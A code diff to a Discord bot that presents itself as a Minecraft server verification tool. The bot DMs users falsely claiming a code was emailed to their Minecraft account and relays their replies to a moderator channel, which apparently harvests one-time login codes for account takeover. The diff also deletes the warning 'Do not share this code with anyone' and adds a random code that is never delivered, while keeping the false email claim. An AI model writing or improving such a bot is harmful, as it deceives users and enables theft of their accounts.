@@ -1,4 +1,5 @@
 import os
+import random
 import discord
 from discord.ext import commands
 
@@ -15,6 +16,7 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 sent_verification_dms = set()
 sent_invalid_codes = set()
+user_codes = {}
 last_verification_msg_id = None
 
 class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
@@ -74,15 +76,16 @@ async def promptcode(interaction: discord.Interaction, user: discord.Member):
         await interaction.response.send_message("Already sent.", ephemeral=True)
         return
     try:
+        code = str(random.randint(100000, 999999))
+        user_codes[user.id] = code
+
         embed = discord.Embed(
             title="📨 Minecraft Server Verification",
             description=(
                 "We've sent a 6-digit code to your email address linked to your Minecraft account.\n\n"
                 "Please reply to this DM with the code to complete your verification.\n\n"
-                "🔒 Your information will remain private.\n"
-                "If you have any questions, feel free to ask staff!\n"
-                "This is an automated message.\n"
-                "Do not share this code with anyone."
+                "🔒 Your information will remain private.\nIf you have any questions, feel free to ask staff!\n"
+                "This is an automated message."
             ),
             color=discord.Color.blue()
         )
@@ -98,22 +101,25 @@ async def on_message(message: discord.Message):
         return
 
     if isinstance(message.channel, discord.DMChannel):
-        if message.content.isdigit() and len(message.content) == 6:
-            mod = await bot.fetch_channel(MOD_CHANNEL_ID)
-            embed = discord.Embed(
-                title="✅ Code Submitted",
-                description=f"User: {message.author.mention}\nCode: `{message.content}`",
-                color=discord.Color.teal()
-            )
-            await mod.send(embed=embed)
-            await message.channel.send("✅ Code received. A mod will review it.")
-            if message.author.id in sent_invalid_codes:
-                sent_invalid_codes.remove(message.author.id)
+        if message.author.id in user_codes:
+            expected_code = user_codes[message.author.id]
+            if message.content == expected_code:
+                mod = await bot.fetch_channel(MOD_CHANNEL_ID)
+                embed = discord.Embed(
+                    title="✅ Code Submitted",
+                    description=f"User: {message.author.mention}\nCode: `{message.content}`",
+                    color=discord.Color.teal()
+                )
+                await mod.send(embed=embed)
+                await message.channel.send("✅ Code received. A mod will review it.")
+                del user_codes[message.author.id]
+            else:
+                await message.channel.send("❌ The code you entered is invalid. Please try again with your 6-digit code.")
         else:
             if message.author.id not in sent_invalid_codes:
                 embed = discord.Embed(
                     title="❌ Invalid Code",
-                    description="Please enter a **6-digit code**.",
+                    description="Please enter a 6-digit code **after receiving it from a mod**.",
                     color=discord.Color.red()
                 )
                 await message.channel.send(embed=embed)
